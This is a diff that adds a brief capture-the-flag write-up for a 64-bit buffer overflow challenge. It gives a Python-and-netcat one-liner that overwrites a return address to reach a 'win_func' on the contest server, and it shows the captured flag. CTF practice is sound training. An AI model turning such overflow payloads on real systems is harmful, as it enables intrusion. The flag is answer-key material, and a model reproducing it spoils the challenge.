@@ -1,0 +1,5 @@
+simple buffer overflow 64 bits on vuln and win_func
+
+(python -c 'print "A"*40 + "\xa7\x06\x40" + "\x00"*5'; cat -) | nc sharkyctf.xyz 20333
+
+shkCTF{#Fr33_fL4g!!_<3}
